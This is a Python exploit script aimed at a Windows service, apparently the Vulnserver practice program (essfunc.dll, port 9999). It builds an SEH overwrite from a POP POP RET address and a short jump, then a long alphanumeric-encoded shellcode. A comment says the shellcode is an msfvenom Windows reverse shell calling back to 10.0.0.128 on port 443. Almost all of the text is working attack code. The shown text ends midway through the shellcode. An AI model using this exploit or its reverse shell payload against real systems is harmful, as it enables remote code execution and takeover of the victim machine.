#!/usr/bin/python

import socket
import os
import sys
from struct import pack

host = "10.0.0.130"
port = 9999

seh = pack("<L", 0x6250120B) # POP POP RET in essfunc.dll
nseh = "\x74\x06\x90\x90" # JZ 6 bytes forward
espAdj = "\x54\x58\x66\x05\x70\x13\x50\x5c" # Move ESP to bottom of D's
backJump1 = ""
backJump1 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
backJump1 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
backJump1 += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
backJump1 += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
backJump1 += "\x50"                 ## push eax
espAdj2 = "\x54\x58\x2c\x34\x50\x5c" # Move ESP to bottom of A's
backJump2 = "\x54\x5b"
backJump2 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
backJump2 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
backJump2 += "\x05\x11\x11\x77\x62" ## add  eax, 0x62771111
backJump2 += "\x05\x11\x11\x66\x62" ## add  eax, 0x62661111
backJump2 += "\x05\x11\x11\x55\x42" ## add  eax, 0x42551111
backJump2 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
backJump2 += "\x50"                 ## push eax
backJump2 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
backJump2 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
backJump2 += "\x05\x41\x76\x77\x07" ## add  eax, 0x07777641
backJump2 += "\x05\x40\x75\x66\x06" ## add  eax, 0x06667540
backJump2 += "\x50"                 ## push eax
espAdj3 = "\x54\x58\x2c\x47\x50\x5c" # Move ESP to bottom of A's again

# Slink encoded payload
# Size 2177 bytes
# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.128 LPORT=443
# -b "\x00" -f hex BufferRegister=ESP
shellcode = ""
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x70\x02\x50\x50" ## add  eax, 0x50500270
shellcode += "\x05\x70\x01\x40\x40" ## add  eax, 0x40400170
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x61\x11\x15\x31" ## add  eax, 0x31151161
shellcode += "\x05\x51\x12\x14\x32" ## add  eax, 0x32141251
shellcode += "\x05\x41\x11\x14\x21" ## add  eax, 0x21141141
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x37\x33\x63\x76" ## add  eax, 0x76633337
shellcode += "\x05\x26\x32\x52\x66" ## add  eax, 0x66523226
shellcode += "\x05\x25\x32\x62\x54" ## add  eax, 0x54623225
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x12\x52\x74\x47" ## add  eax, 0x47745212
shellcode += "\x05\x11\x41\x63\x46" ## add  eax, 0x46634111
shellcode += "\x05\x12\x42\x53\x35" ## add  eax, 0x35534212
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x73\x65\x42\x45" ## add  eax, 0x45426573
shellcode += "\x05\x62\x54\x31\x44" ## add  eax, 0x44315462
shellcode += "\x05\x52\x34\x32\x34" ## add  eax, 0x34323452
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x64\x24\x43\x71" ## add  eax, 0x71432464
shellcode += "\x05\x54\x24\x33\x62" ## add  eax, 0x62332454
shellcode += "\x05\x43\x23\x33\x51" ## add  eax, 0x51332343
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x42\x43\x56\x57" ## add  eax, 0x57564342
shellcode += "\x05\x42\x43\x45\x56" ## add  eax, 0x56454342
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x16\x67\x66\x67" ## add  eax, 0x67666716
shellcode += "\x05\x15\x66\x55\x56" ## add  eax, 0x56556615
shellcode += "\x05\x13\x45\x46\x65" ## add  eax, 0x65464513
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x76\x43\x32\x33" ## add  eax, 0x33324376
shellcode += "\x05\x65\x42\x21\x23" ## add  eax, 0x23214265
shellcode += "\x05\x53\x42\x22\x23" ## add  eax, 0x23224253
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x36\x36\x44\x76" ## add  eax, 0x76443636
shellcode += "\x05\x35\x35\x43\x66" ## add  eax, 0x66433535
shellcode += "\x05\x23\x33\x43\x54" ## add  eax, 0x54433323
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x46\x35\x66\x47" ## add  eax, 0x47663546
shellcode += "\x05\x45\x34\x55\x46" ## add  eax, 0x46553445
shellcode += "\x05\x33\x24\x66\x45" ## add  eax, 0x45662433
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x71\x15\x71\x17" ## add  eax, 0x17711571
shellcode += "\x05\x61\x05\x60\x17" ## add  eax, 0x17600561
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x73\x36\x26\x47" ## add  eax, 0x47263673
shellcode += "\x05\x63\x35\x16\x46" ## add  eax, 0x46163563
shellcode += "\x05\x53\x34\x24\x45" ## add  eax, 0x45243453
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x62\x55\x16\x57" ## add  eax, 0x57165562
shellcode += "\x05\x52\x55\x15\x47" ## add  eax, 0x47155552
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x63\x70\x66\x63" ## add  eax, 0x63667063
shellcode += "\x05\x64\x70\x55\x63" ## add  eax, 0x63557064
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x36\x07\x61\x06" ## add  eax, 0x06610736
shellcode += "\x05\x36\x07\x60\x06" ## add  eax, 0x06600736
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x25\x30\x13\x55" ## add  eax, 0x55133025
shellcode += "\x05\x15\x20\x04\x55" ## add  eax, 0x55042015
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x61\x66\x22\x72" ## add  eax, 0x72226661
shellcode += "\x05\x52\x55\x12\x61" ## add  eax, 0x61125552
shellcode += "\x05\x31\x43\x22\x52" ## add  eax, 0x52224331
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x43\x67\x22\x25" ## add  eax, 0x25226743
shellcode += "\x05\x43\x56\x22\x14" ## add  eax, 0x14225643
shellcode += "\x05\x32\x65\x22\x24" ## add  eax, 0x24226532
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x22\x70\x55\x53" ## add  eax, 0x53557022
shellcode += "\x05\x12\x70\x55\x53" ## add  eax, 0x53557012
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x50\x43\x77\x34" ## add  eax, 0x34774350
shellcode += "\x05\x50\x43\x77\x44" ## add  eax, 0x44774350
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x74\x26\x64\x31" ## add  eax, 0x31642674
shellcode += "\x05\x64\x15\x54\x31" ## add  eax, 0x31541564
shellcode += "\x05\x54\x24\x43\x31" ## add  eax, 0x31432454
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x03\x73\x16\x26" ## add  eax, 0x26167303
shellcode += "\x05\x04\x62\x06\x26" ## add  eax, 0x26066204
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x15\x35\x26\x16" ## add  eax, 0x16263515
shellcode += "\x05\x05\x45\x25\x05" ## add  eax, 0x05254505
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x44\x57\x46\x27" ## add  eax, 0x27465744
shellcode += "\x05\x44\x46\x45\x26" ## add  eax, 0x26454644
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x33\x13\x72\x47" ## add  eax, 0x47721333
shellcode += "\x05\x44\x14\x71\x47" ## add  eax, 0x47711444
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x33\x34\x65\x03" ## add  eax, 0x03653433
shellcode += "\x05\x44\x34\x54\x04" ## add  eax, 0x04543444
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x37\x17\x55\x37" ## add  eax, 0x37551737
shellcode += "\x05\x47\x06\x54\x37" ## add  eax, 0x37540647
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x73\x66\x33\x47" ## add  eax, 0x47336673
shellcode += "\x05\x63\x55\x32\x46" ## add  eax, 0x46325563
shellcode += "\x05\x52\x66\x22\x45" ## add  eax, 0x45226652
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x64\x21\x24\x47" ## add  eax, 0x47242164
shellcode += "\x05\x54\x21\x14\x46" ## add  eax, 0x46142154
shellcode += "\x05\x63\x21\x24\x45" ## add  eax, 0x45242163
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x41\x34\x31\x76" ## add  eax, 0x76313441
shellcode += "\x05\x32\x34\x32\x65" ## add  eax, 0x65323432
shellcode += "\x05\x31\x34\x21\x56" ## add  eax, 0x56213431
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x17\x26\x63\x21" ## add  eax, 0x21632617
shellcode += "\x05\x06\x16\x63\x20" ## add  eax, 0x20631606
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x33\x61\x10\x16" ## add  eax, 0x16106133
shellcode += "\x05\x22\x50\x10\x15" ## add  eax, 0x15105022
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x25\x62\x10\x15" ## add  eax, 0x15106225
shellcode += "\x05\x14\x51\x10\x15" ## add  eax, 0x15105114
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x06\x11\x17\x15" ## add  eax, 0x15171106
shellcode += "\x05\x06\x11\x07\x15" ## add  eax, 0x15071106
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x32\x43\x72\x65" ## add  eax, 0x65724332
shellcode += "\x05\x31\x44\x71\x54" ## add  eax, 0x54714431
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x26\x53\x74\x32" ## add  eax, 0x32745326
shellcode += "\x05\x16\x44\x64\x21" ## add  eax, 0x21644416
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x36\x77\x62\x36" ## add  eax, 0x36627736
shellcode += "\x05\x25\x66\x51\x35" ## add  eax, 0x35516625
shellcode += "\x05\x23\x55\x32\x23" ## add  eax, 0x23325523
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x50\x27\x61\x56" ## add  eax, 0x56612750
shellcode += "\x05\x40\x17\x61\x45" ## add  eax, 0x45611740
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x23\x35\x51\x22" ## add  eax, 0x22513523
shellcode += "\x05\x22\x34\x41\x11" ## add  eax, 0x11413422
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x12\x71\x21\x45" ## add  eax, 0x45217112
shellcode += "\x05\x12\x71\x21\x45" ## add  eax, 0x45217112
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x30\x61\x14\x16" ## add  eax, 0x16146130
shellcode += "\x05\x40\x51\x14\x05" ## add  eax, 0x05145140
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x37\x31\x61\x66" ## add  eax, 0x66613137
shellcode += "\x05\x26\x22\x52\x65" ## add  eax, 0x65522226
shellcode += "\x05\x25\x21\x61\x44" ## add  eax, 0x44612125
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x33\x73\x36\x21" ## add  eax, 0x21367333
shellcode += "\x05\x32\x63\x36\x12" ## add  eax, 0x12366332
shellcode += "\x05\x22\x52\x34\x21" ## add  eax, 0x21345222
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x56\x15\x35\x77" ## add  eax, 0x77351556
shellcode += "\x05\x45\x15\x35\x67" ## add  eax, 0x67351545
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x23\x41\x76\x36" ## add  eax, 0x36764123
shellcode += "\x05\x22\x31\x65\x36" ## add  eax, 0x36653122
shellcode += "\x05\x22\x31\x54\x34" ## add  eax, 0x34543122
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x16\x64\x47\x37" ## add  eax, 0x37476416
shellcode += "\x05\x25\x53\x46\x36" ## add  eax, 0x36465325
shellcode += "\x05\x13\x63\x35\x25" ## add  eax, 0x25356313
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x63\x65\x37\x47" ## add  eax, 0x47376563
shellcode += "\x05\x63\x54\x36\x46" ## add  eax, 0x46365463
shellcode += "\x05\x43\x44\x35\x45" ## add  eax, 0x45354443
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x41\x63\x26\x73" ## add  eax, 0x73266341
shellcode += "\x05\x42\x53\x15\x63" ## add  eax, 0x63155342
shellcode += "\x05\x31\x33\x24\x53" ## add  eax, 0x53243331
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x76\x11\x13\x76" ## add  eax, 0x76131176
shellcode += "\x05\x66\x01\x14\x65" ## add  eax, 0x65140166
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x35\x77\x23\x30" ## add  eax, 0x30237735
shellcode += "\x05\x35\x76\x14\x40" ## add  eax, 0x40147635
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x55\x22\x37\x52" ## add  eax, 0x52372255
shellcode += "\x05\x54\x21\x37\x42" ## add  eax, 0x42372154
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x75\x33\x55\x66" ## add  eax, 0x66553375
shellcode += "\x05\x74\x34\x55\x66" ## add  eax, 0x66553474
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x30\x20\x32\x22" ## add  eax, 0x22322030
shellcode += "\x05\x30\x20\x32\x22" ## add  eax, 0x22322030
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x36\x42\x67\x24" ## add  eax, 0x24674236
shellcode += "\x05\x36\x42\x56\x24" ## add  eax, 0x24564236
shellcode += "\x05\x24\x32\x45\x23" ## add  eax, 0x23453224
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x50\x63\x43\x12" ## add  eax, 0x12436350
shellcode += "\x05\x40\x64\x44\x02" ## add  eax, 0x02446440
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x26\x11\x66\x14" ## add  eax, 0x14661126
shellcode += "\x05\x25\x21\x55\x23" ## add  eax, 0x23552125
shellcode += "\x05\x24\x11\x44\x13" ## add  eax, 0x13441124
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x63\x53\x70\x73" ## add  eax, 0x73705363
shellcode += "\x05\x54\x53\x70\x73" ## add  eax, 0x73705354
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x36\x22\x72\x26" ## add  eax, 0x26722236
shellcode += "\x05\x35\x12\x61\x26" ## add  eax, 0x26611235
shellcode += "\x05\x33\x22\x52\x24" ## add  eax, 0x24522233
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x63\x11\x23\x27" ## add  eax, 0x27231163
shellcode += "\x05\x63\x21\x13\x26" ## add  eax, 0x26132163
shellcode += "\x05\x43\x11\x22\x25" ## add  eax, 0x25221143
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x13\x33\x66\x26" ## add  eax, 0x26663313
shellcode += "\x05\x12\x32\x65\x16" ## add  eax, 0x16653212
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x63\x16\x45\x76" ## add  eax, 0x76451663
shellcode += "\x05\x63\x25\x44\x65" ## add  eax, 0x65442563
shellcode += "\x05\x43\x13\x34\x53" ## add  eax, 0x53341343
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x13\x62\x52\x22" ## add  eax, 0x22526213
shellcode += "\x05\x03\x52\x51\x11" ## add  eax, 0x11515203
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x34\x23\x31\x74" ## add  eax, 0x74312334
shellcode += "\x05\x34\x13\x32\x64" ## add  eax, 0x64321334
shellcode += "\x05\x23\x22\x31\x54" ## add  eax, 0x54312223
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x36\x36\x65\x05" ## add  eax, 0x05653636
shellcode += "\x05\x26\x35\x65\x04" ## add  eax, 0x04653526
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x12\x11\x70\x62" ## add  eax, 0x62701112
shellcode += "\x05\x12\x11\x60\x62" ## add  eax, 0x62601112
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x37\x70\x71\x03" ## add  eax, 0x03717037
shellcode += "\x05\x46\x70\x60\x04" ## add  eax, 0x04607046
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x36\x61\x37\x06" ## add  eax, 0x06376136
shellcode += "\x05\x45\x60\x47\x05" ## add  eax, 0x05476045
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x35\x21\x55\x66" ## add  eax, 0x66552135
shellcode += "\x05\x35\x20\x44\x55" ## add  eax, 0x55442035
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x17\x34\x11\x73" ## add  eax, 0x73113417
shellcode += "\x05\x07\x44\x01\x74" ## add  eax, 0x74014407
